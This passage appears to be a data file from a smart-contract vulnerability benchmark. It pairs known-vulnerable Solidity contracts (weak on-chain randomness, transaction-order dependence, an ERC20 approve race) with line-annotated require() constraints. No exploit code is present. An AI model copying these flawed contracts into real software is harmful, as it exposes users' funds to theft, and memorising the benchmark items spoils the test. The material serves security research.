            "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#oddsandevens\n * @author: -\n * @vulnerable_at_lines: 25,28\n */\n\npragma solidity ^0.4.2;\n\ncontract OddsAndEvens{\n\n  struct Player {\n    address addr;\n    uint number;\n  }\n\n  Player[2] public players;         //public only for debug purpose\n\n  uint8 tot;\n  address owner;\n\n  function OddsAndEvens() {\n    owner = msg.sender;\n  }\n\n  function play(uint number) payable{\n    if (msg.value != 1 ether) throw;\n\n    players[tot] = Player(msg.sender, number);\n    tot++;\n\n    if (tot==2) andTheWinnerIs();\n  }\n\n  function andTheWinnerIs() private {\n    bool res ;\n    uint n = players[0].number+players[1].number;\n    if (n%2==0) {\n      res = players[0].addr.send(1800 finney);\n    }\n    else {\n      res = players[1].addr.send(1800 finney);\n    }\n\n    delete players;\n    tot=0;\n  }\n\n  function getProfit() {\n    if(msg.sender!=owner) throw;\n    bool res = msg.sender.send(this.balance);\n  }\n\n}",
            {
                "VL": [
                    24,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    10,
                    "require(msg.value==1ether);"
                ],
                "post": [
                    53,
                    "require(msg.sender.send(this.balance));"
                ]
            }
        ],
        [
            "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#oddsandevens\n * @author: -\n * @vulnerable_at_lines: 25,28\n */\n\npragma solidity ^0.4.2;\n\ncontract OddsAndEvens{\n\n  struct Player {\n    address addr;\n    uint number;\n  }\n\n  Player[2] public players;         //public only for debug purpose\n\n  uint8 tot;\n  address owner;\n\n  function OddsAndEvens() {\n    owner = msg.sender;\n  }\n\n  function play(uint number) payable{\n    if (msg.value != 1 ether) throw;\n\n    players[tot] = Player(msg.sender, number);\n    tot++;\n\n    if (tot==2) andTheWinnerIs();\n  }\n\n  function andTheWinnerIs() private {\n    bool res ;\n    uint n = players[0].number+players[1].number;\n    if (n%2==0) {\n      res = players[0].addr.send(1800 finney);\n    }\n    else {\n      res = players[1].addr.send(1800 finney);\n    }\n\n    delete players;\n    tot=0;\n  }\n\n  function getProfit() {\n    if(msg.sender!=owner) throw;\n    bool res = msg.sender.send(this.balance);\n  }\n\n}",
            {
                "VL": [
                    27,
                    "require(tot<2);"
                ],
                "pre": [
                    26,
                    "require(tot<2);"
                ],
                "post": [
                    32,
                    "require(false);"
                ]
            }
        ]
    ],
    "FindThisHash.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.22;\n\ncontract FindThisHash {\n    bytes32 constant public hash = 0x3ea2f1d0abf3fc66cf29eebb70cbd4e7fe762ef8a09bcc06c8edf641230afec0;\n\n    constructor() public payable {} // load with ether\n\n    function solve(string solution) public {\n        // If you can find the pre image of the hash, receive 1000 ether\n\n        require(hash == sha3(solution));\n        msg.sender.transfer(1000 ether);\n    }\n}",
            {
                "VL": [
                    16,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    15,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    19,
                    "require(false);"
                ]
            }
        ]
    ],
    "eth_tx_order_dependence_minimal.sol": [
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 23,31\n */\n\npragma solidity ^0.4.16;\n\ncontract EthTxOrderDependenceMinimal {\n    address public owner;\n    bool public claimed;\n    uint public reward;\n\n    function EthTxOrderDependenceMinimal() public {\n        owner = msg.sender;\n    }\n\n    function setReward() public payable {\n        require (!claimed);\n\n        require(msg.sender == owner);\n\n        owner.transfer(reward);\n        reward = msg.value;\n    }\n\n    function claimReward(uint256 submission) {\n        require (!claimed);\n        require(submission < 10);\n\n        msg.sender.transfer(reward);\n        claimed = true;\n    }\n}",
            {
                "VL": [
                    22,
                    "require(msg.value>reward);"
                ],
                "pre": [
                    19,
                    "require(msg.value>reward);"
                ],
                "post": [
                    25,
                    "require(reward==msg.value);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 23,31\n */\n\npragma solidity ^0.4.16;\n\ncontract EthTxOrderDependenceMinimal {\n    address public owner;\n    bool public claimed;\n    uint public reward;\n\n    function EthTxOrderDependenceMinimal() public {\n        owner = msg.sender;\n    }\n\n    function setReward() public payable {\n        require (!claimed);\n\n        require(msg.sender == owner);\n\n        owner.transfer(reward);\n        reward = msg.value;\n    }\n\n    function claimReward(uint256 submission) {\n        require (!claimed);\n        require(submission < 10);\n\n        msg.sender.transfer(reward);\n        claimed = true;\n    }\n}",
            {
                "VL": [
                    30,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    28,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    33,
                    "require(msg.sender.send(this.balance));"
                ]
            }
        ]
    ],
    "ERC20.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/transaction_order_dependence/ERC20.sol\n * @author: -\n * @vulnerable_at_lines: 110,113\n */\n\npragma solidity ^0.4.24;\n\n/** Taken from the OpenZeppelin github\n * @title SafeMath\n * @dev Math operations with safety checks that revert on error\n */\nlibrary SafeMath {\n\n  /**\n  * @dev Multiplies two numbers, reverts on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) {\n      return 0;\n    }\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  }\n\n  /**\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  }\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b <= a);\n    uint256 c = a - b;\n\n    return c;\n  }\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  }\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b != 0);\n    return a % b;\n  }\n}\n\n\ncontract ERC20 {\n\n  event Transfer( address indexed from, address indexed to, uint256 value );\n  event Approval( address indexed owner, address indexed spender, uint256 value);\n  using SafeMath for *;\n\n  mapping (address => uint256) private _balances;\n\n  mapping (address => mapping (address => uint256)) private _allowed;\n\n  uint256 private _totalSupply;\n\n  constructor(uint totalSupply){\n    _balances[msg.sender] = totalSupply;\n  }\n\n  function balanceOf(address owner) public view returns (uint256) {\n    return _balances[owner];\n  }\n\n\n  function allowance(address owner, address spender) public view returns (uint256)\n  {\n    return _allowed[owner][spender];\n  }\n\n  function transfer(address to, uint256 value) public returns (bool) {\n    require(value <= _balances[msg.sender]);\n    require(to != address(0));\n\n    _balances[msg.sender] = _balances[msg.sender].sub(value);\n    _balances[to] = _balances[to].add(value);\n    emit Transfer(msg.sender, to, value);\n    return true;\n  }\n\n  function approve(address spender, uint256 value) public returns (bool) {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = value;\n    emit Approval(msg.sender, spender, value);\n    return true;\n  }\n\n  function transferFrom(address from, address to, uint256 value) public returns (bool) {\n    require(value <= _balances[from]);\n    require(value <= _allowed[from][msg.sender]);\n    require(to != address(0));\n\n    _balances[from] = _balances[from].sub(value);\n    _balances[to] = _balances[to].add(value);\n    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n    emit Transfer(from, to, value);\n    return true;\n  }\n}",
            {
                "VL": [
                    109,
                    "require(value<=_balances[msg.sender]);"
                ],
                "pre": [
                    75,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    129,
                    "require(value<=_balances[from]);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/transaction_order_dependence/ERC20.sol\n * @author: -\n * @vulnerable_at_lines: 110,113\n */\n\npragma solidity ^0.4.24;\n\n/** Taken from the OpenZeppelin github\n * @title SafeMath\n * @dev Math operations with safety checks that revert on error\n */\nlibrary SafeMath {\n\n  /**\n  * @dev Multiplies two numbers, reverts on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) {\n      return 0;\n    }\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  }\n\n  /**\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  }\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b <= a);\n    uint256 c = a - b;\n\n    return c;\n  }\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  }\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b != 0);\n    return a % b;\n  }\n}\n\n\ncontract ERC20 {\n\n  event Transfer( address indexed from, address indexed to, uint256 value );\n  event Approval( address indexed owner, address indexed spender, uint256 value);\n  using SafeMath for *;\n\n  mapping (address => uint256) private _balances;\n\n  mapping (address => mapping (address => uint256)) private _allowed;\n\n  uint256 private _totalSupply;\n\n  constructor(uint totalSupply){\n    _balances[msg.sender] = totalSupply;\n  }\n\n  function balanceOf(address owner) public view returns (uint256) {\n    return _balances[owner];\n  }\n\n\n  function allowance(address owner, address spender) public view returns (uint256)\n  {\n    return _allowed[owner][spender];\n  }\n\n  function transfer(address to, uint256 value) public returns (bool) {\n    require(value <= _balances[msg.sender]);\n    require(to != address(0));\n\n    _balances[msg.sender] = _balances[msg.sender].sub(value);\n    _balances[to] = _balances[to].add(value);\n    emit Transfer(msg.sender, to, value);\n    return true;\n  }\n\n  function approve(address spender, uint256 value) public returns (bool) {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = value;\n    emit Approval(msg.sender, spender, value);\n    return true;\n  }\n\n  function transferFrom(address from, address to, uint256 value) public returns (bool) {\n    require(value <= _balances[from]);\n    require(value <= _allowed[from][msg.sender]);\n    require(to != address(0));\n\n    _balances[from] = _balances[from].sub(value);\n    _balances[to] = _balances[to].add(value);\n    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n    emit Transfer(from, to, value);\n    return true;\n  }\n}",
            {
                "VL": [
                    112,
                    "require(value<=_balances[msg.sender]);"
                ],
                "pre": [
                    111,
                    "require(value==0||_allowed[msg.sender][spender]==0);"
                ],
                "post": [
                    116,
                    "require(value<=_balances[msg.sender]);"
                ]
            }
        ]
    ],
    "lucky_doubler.sol": [
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8#code\n * @vulnerable_at_lines: 127,128,129,130,132\n * @author: -\n */\n\n //added pragma version\npragma solidity ^0.4.0;\n\n contract LuckyDoubler {\n//##########################################################\n//#### LuckyDoubler: A doubler with random payout order ####\n//#### Deposit 1 ETHER to participate                   ####\n//##########################################################\n//COPYRIGHT 2016 KATATSUKI ALL RIGHTS RESERVED\n//No part of this source code may be reproduced, distributed,\n//modified or transmitted in any form or by any means without\n//the prior written permission of the creator.\n\n    address private owner;\n\n    //Stored variables\n    uint private balance = 0;\n    uint private fee = 5;\n    uint private multiplier = 125;\n\n    mapping (address => User) private users;\n    Entry[] private entries;\n    uint[] private unpaidEntries;\n\n    //Set owner on contract creation\n    function LuckyDoubler() {\n        owner = msg.sender;\n    }\n\n    modifier onlyowner { if (msg.sender == owner) _; }\n\n    struct User {\n        address id;\n        uint deposits;\n        uint payoutsReceived;\n    }\n\n    struct Entry {\n        address entryAddress;\n        uint deposit;\n        uint payout;\n        bool paid;\n    }\n\n    //Fallback function\n    function() {\n        init();\n    }\n\n    function init() private{\n\n        if (msg.value < 1 ether) {\n             msg.sender.send(msg.value);\n            return;\n        }\n\n        join();\n    }\n\n    function join() private {\n\n        //Limit deposits to 1ETH\n        uint dValue = 1 ether;\n\n        if (msg.value > 1 ether) {\n\n        \tmsg.sender.send(msg.value - 1 ether);\n        \tdValue = 1 ether;\n        }\n\n        //Add new users to the users array\n        if (users[msg.sender].id == address(0))\n        {\n            users[msg.sender].id = msg.sender;\n            users[msg.sender].deposits = 0;\n            users[msg.sender].payoutsReceived = 0;\n        }\n\n        //Add new entry to the entries array\n        entries.push(Entry(msg.sender, dValue, (dValue * (multiplier) / 100), false));\n        users[msg.sender].deposits++;\n        unpaidEntries.push(entries.length -1);\n\n        //Collect fees and update contract balance\n        balance += (dValue * (100 - fee)) / 100;\n\n        uint index = unpaidEntries.length > 1 ? rand(unpaidEntries.length) : 0;\n        Entry theEntry = entries[unpaidEntries[index]];\n\n        //Pay pending entries if the new balance allows for it\n        if (balance > theEntry.payout) {\n\n            uint payout = theEntry.payout;\n\n            theEntry.entryAddress.send(payout);\n            theEntry.paid = true;\n            users[theEntry.entryAddress].payoutsReceived++;\n\n            balance -= payout;\n\n            if (index < unpaidEntries.length - 1)\n                unpaidEntries[index] = unpaidEntries[unpaidEntries.length - 1];\n\n            unpaidEntries.length--;\n\n        }\n\n        //Collect money from fees and possible leftovers from errors (actual balance untouched)\n        uint fees = this.balance - balance;\n        if (fees > 0)\n        {\n                owner.send(fees);\n        }\n\n    }\n\n    //Generate random number between 0 & max\n    uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;\n\n    function rand(uint max) constant private returns (uint256 result){\n        uint256 factor = FACTOR * 100 / max;\n        uint256 lastBlockNumber = block.number - 1;\n        uint256 hashVal = uint256(block.blockhash(lastBlockNumber));\n\n        return uint256((uint256(hashVal) / factor)) % max;\n    }\n\n\n    //Contract management\n    function changeOwner(address newOwner) onlyowner {\n        owner = newOwner;\n    }\n\n    function changeMultiplier(uint multi) onlyowner {\n        if (multi < 110 || multi > 150) throw;\n\n        multiplier = multi;\n    }\n\n    function changeFee(uint newFee) onlyowner {\n        if (fee > 5)\n            throw;\n        fee = newFee;\n    }\n\n\n    //JSON functions\n    function multiplierFactor() constant returns (uint factor, string info) {\n        factor = multiplier;\n        info = 'The current multiplier applied to all deposits. Min 110%, max 150%.';\n    }\n\n    function currentFee() constant returns (uint feePercentage, string info) {\n        feePercentage = fee;\n        info = 'The fee percentage applied to all deposits. It can change to speed payouts (max 5%).';\n    }\n\n    function totalEntries() constant returns (uint count, string info) {\n        count = entries.length;\n        info = 'The number of deposits.';\n    }\n\n    function userStats(address user) constant returns (uint deposits, uint payouts, string info)\n    {\n        if (users[user].id != address(0x0))\n        {\n            deposits = users[user].deposits;\n            payouts = users[user].payoutsReceived;\n            info = 'Users stats: total deposits, payouts received.';\n        }\n    }\n\n    function entryDetails(uint index) constant returns (address user, uint payout, bool paid, string info)\n    {\n        if (index < entries.length) {\n            user = entries[index].entryAddress;\n            payout = entries[index].payout / 1 finney;\n            paid = entries[index].paid;\n            info = 'Entry info: user address, expected payout in Finneys, payout status.';\n        }\n    }\n\n\n}",
            {
                "VL": [
                    126,
                    "require(FACTOR>0);"
                ],
                "pre": [
                    12,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    191,
                    "require(false);"
                ]
            }
        ]
    ],
    "old_blockhash.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/old_blockhash.sol\n * @author: -\n * @vulnerable_at_lines: 35\n */\n\npragma solidity ^0.4.24;\n\n//Based on the the Capture the Ether challange at https://capturetheether.com/challenges/lotteries/predict-the-block-hash/\n//Note that while it seems to have a 1/2^256 chance you guess the right hash, actually blockhash returns zero for blocks numbers that are more than 256 blocks ago so you can guess zero and wait.\ncontract PredictTheBlockHashChallenge {\n\n    struct guess{\n      uint block;\n      bytes32 guess;\n    }\n\n    mapping(address => guess) guesses;\n\n    constructor() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function lockInGuess(bytes32 hash) public payable {\n        require(guesses[msg.sender].block == 0);\n        require(msg.value == 1 ether);\n\n        guesses[msg.sender].guess = hash;\n        guesses[msg.sender].block  = block.number + 1;\n    }\n\n    function settle() public {\n        require(block.number > guesses[msg.sender].block);\n\n        bytes32 answer = blockhash(guesses[msg.sender].block);\n\n        guesses[msg.sender].block = 0;\n        if (guesses[msg.sender].guess == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}",
            {
                "VL": [
                    34,
                    "require(guesses[msg.sender].block!=0);"
                ],
                "pre": [
                    33,
                    "require(guesses[msg.sender].block!=0);"
                ],
                "post": [
                    41,
                    "require(false);"
                ]
            }
        ]
    ],
    "guess_the_random_number.sol": [
        [
            "/*\n * @source: https://capturetheether.com/challenges/lotteries/guess-the-random-number/\n * @author: Steve Marx\n * @vulnerable_at_lines: 15\n */\n\npragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge {\n    uint8 answer;\n\n    function GuessTheRandomNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}",
            {
                "VL": [
                    14,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    13,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    16,
                    "require(answer<100);"
                ]
            }
        ]
    ],
    "etheraffle.sol": [
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code\n * @vulnerable_at_lines: 49,99,101,103,114,158\n * @author: -\n */\n\n pragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address addr;\n        uint raffleId;\n    }\n\n    event RaffleResult(\n        uint raffleId,\n        uint winningNumber,\n        address winningAddress,\n        address seed1,\n        address seed2,\n        uint seed3,\n        bytes32 randHash\n    );\n\n    event TicketPurchase(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    event TicketRefund(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    // Constants\n    uint public constant prize = 2.5 ether;\n    uint public constant fee = 0.03 ether;\n    uint public constant totalTickets = 50;\n    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly\n    address feeAddress;\n\n    // Other internal variables\n    bool public paused = false;\n    uint public raffleId = 1;\n\n    uint public blockNumber = block.number;\n    uint nextTicket = 0;\n    mapping (uint => Contestant) contestants;\n    uint[] gaps;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        feeAddress = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        buyTickets();\n    }\n\n    function buyTickets() payable public {\n        if (paused) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint moneySent = msg.value;\n\n        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {\n            uint currTicket = 0;\n            if (gaps.length > 0) {\n                currTicket = gaps[gaps.length-1];\n                gaps.length--;\n            } else {\n                currTicket = nextTicket++;\n            }\n\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\n            TicketPurchase(raffleId, msg.sender, currTicket);\n            moneySent -= pricePerTicket;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (nextTicket == totalTickets) {\n            chooseWinner();\n        }\n\n        // Send back leftover money\n        if (moneySent > 0) {\n            msg.sender.transfer(moneySent);\n        }\n    }\n\n    function chooseWinner() private {\n\n        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\n\n        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;\n\n        uint seed3 = block.difficulty;\n        bytes32 randHash = keccak256(seed1, seed2, seed3);\n\n        uint winningNumber = uint(randHash) % totalTickets;\n        address winningAddress = contestants[winningNumber].addr;\n        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\n\n        // Start next raffle\n        raffleId++;\n        nextTicket = 0;\n\n        blockNumber = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        winningAddress.transfer(prize);\n        feeAddress.transfer(fee);\n    }\n\n    // Get your money back before the raffle occurs\n    function getRefund() public {\n        uint refund = 0;\n        for (uint i = 0; i < totalTickets; i++) {\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\n                refund += pricePerTicket;\n                contestants[i] = Contestant(address(0), 0);\n                gaps.push(i);\n                TicketRefund(raffleId, msg.sender, i);\n            }\n        }\n\n        if (refund > 0) {\n            msg.sender.transfer(refund);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function endRaffle() public {\n        if (msg.sender == feeAddress) {\n            paused = true;\n\n            for (uint i = 0; i < totalTickets; i++) {\n                if (raffleId == contestants[i].raffleId) {\n                    TicketRefund(raffleId, contestants[i].addr, i);\n                    contestants[i].addr.transfer(pricePerTicket);\n                }\n            }\n\n            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\n            raffleId++;\n            nextTicket = 0;\n\n            blockNumber = block.number;\n            gaps.length = 0;\n        }\n    }\n\n    function togglePause() public {\n        if (msg.sender == feeAddress) {\n            paused = !paused;\n        }\n    }\n\n    function kill() public {\n        if (msg.sender == feeAddress) {\n            selfdestruct(feeAddress);\n        }\n    }\n}",
            {
                "VL": [
                    48,
                    "require(pricePerTicket==(prize+fee)/totalTickets);"
                ],
                "pre": [
                    11,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    174,
                    "require(msg.sender==feeAddress);"
                ]
            }
        ],
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code\n * @vulnerable_at_lines: 49,99,101,103,114,158\n * @author: -\n */\n\n pragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address addr;\n        uint raffleId;\n    }\n\n    event RaffleResult(\n        uint raffleId,\n        uint winningNumber,\n        address winningAddress,\n        address seed1,\n        address seed2,\n        uint seed3,\n        bytes32 randHash\n    );\n\n    event TicketPurchase(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    event TicketRefund(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    // Constants\n    uint public constant prize = 2.5 ether;\n    uint public constant fee = 0.03 ether;\n    uint public constant totalTickets = 50;\n    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly\n    address feeAddress;\n\n    // Other internal variables\n    bool public paused = false;\n    uint public raffleId = 1;\n\n    uint public blockNumber = block.number;\n    uint nextTicket = 0;\n    mapping (uint => Contestant) contestants;\n    uint[] gaps;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        feeAddress = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        buyTickets();\n    }\n\n    function buyTickets() payable public {\n        if (paused) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint moneySent = msg.value;\n\n        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {\n            uint currTicket = 0;\n            if (gaps.length > 0) {\n                currTicket = gaps[gaps.length-1];\n                gaps.length--;\n            } else {\n                currTicket = nextTicket++;\n            }\n\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\n            TicketPurchase(raffleId, msg.sender, currTicket);\n            moneySent -= pricePerTicket;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (nextTicket == totalTickets) {\n            chooseWinner();\n        }\n\n        // Send back leftover money\n        if (moneySent > 0) {\n            msg.sender.transfer(moneySent);\n        }\n    }\n\n    function chooseWinner() private {\n\n        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\n\n        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;\n\n        uint seed3 = block.difficulty;\n        bytes32 randHash = keccak256(seed1, seed2, seed3);\n\n        uint winningNumber = uint(randHash) % totalTickets;\n        address winningAddress = contestants[winningNumber].addr;\n        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\n\n        // Start next raffle\n        raffleId++;\n        nextTicket = 0;\n\n        blockNumber = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        winningAddress.transfer(prize);\n        feeAddress.transfer(fee);\n    }\n\n    // Get your money back before the raffle occurs\n    function getRefund() public {\n        uint refund = 0;\n        for (uint i = 0; i < totalTickets; i++) {\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\n                refund += pricePerTicket;\n                contestants[i] = Contestant(address(0), 0);\n                gaps.push(i);\n                TicketRefund(raffleId, msg.sender, i);\n            }\n        }\n\n        if (refund > 0) {\n            msg.sender.transfer(refund);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function endRaffle() public {\n        if (msg.sender == feeAddress) {\n            paused = true;\n\n            for (uint i = 0; i < totalTickets; i++) {\n                if (raffleId == contestants[i].raffleId) {\n                    TicketRefund(raffleId, contestants[i].addr, i);\n                    contestants[i].addr.transfer(pricePerTicket);\n                }\n            }\n\n            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\n            raffleId++;\n            nextTicket = 0;\n\n            blockNumber = block.number;\n            gaps.length = 0;\n        }\n    }\n\n    function togglePause() public {\n        if (msg.sender == feeAddress) {\n            paused = !paused;\n        }\n    }\n\n    function kill() public {\n        if (msg.sender == feeAddress) {\n            selfdestruct(feeAddress);\n        }\n    }\n}",
            {
                "VL": [
                    98,
                    "require(nextTicket==totalTickets);"
                ],
                "pre": [
                    98,
                    "require(nextTicket==totalTickets);"
                ],
                "post": [
                    123,
                    "require(block.number>blockNumber);"
                ]
            }
        ],
        [
            "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code\n * @vulnerable_at_lines: 49,99,101,103,114,158\n * @author: -\n */\n\n pragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address addr;\n        uint raffleId;\n    }\n\n    event RaffleResult(\n        uint raffleId,\n        uint winningNumber,\n        address winningAddress,\n        address seed1,\n        address seed2,\n        uint seed3,\n        bytes32 randHash\n    );\n\n    event TicketPurchase(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    event TicketRefund(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    // Constants\n    uint public constant prize = 2.5 ether;\n    uint public constant fee = 0.03 ether;\n    uint public constant totalTickets = 50;\n    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly\n    address feeAddress;\n\n    // Other internal variables\n    bool public paused = false;\n    uint public raffleId = 1;\n\n    uint public blockNumber = block.number;\n    uint nextTicket = 0;\n    mapping (uint => Contestant) contestants;\n    uint[] gaps;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        feeAddress = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        buyTickets();\n    }\n\n    function buyTickets() payable public {\n        if (paused) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint moneySent = msg.value;\n\n        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {\n            uint currTicket = 0;\n            if (gaps.length > 0) {\n                currTicket = gaps[gaps.length-1];\n                gaps.length--;\n            } else {\n                currTicket = nextTicket++;\n            }\n\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\n            TicketPurchase(raffleId, msg.sender, currTicket);\n            moneySent -= pricePerTicket;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (nextTicket == totalTickets) {\n            chooseWinner();\n        }\n\n        // Send back leftover money\n        if (moneySent > 0) {\n            msg.sender.transfer(moneySent);\n        }\n    }\n\n    function chooseWinner() private {\n\n        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\n\n        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;\n\n        uint seed3 = block.difficulty;\n        bytes32 randHash = keccak256(seed1, seed2, seed3);\n\n        uint winningNumber = uint(randHash) % totalTickets;\n        address winningAddress = contestants[winningNumber].addr;\n        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\n\n        // Start next raffle\n        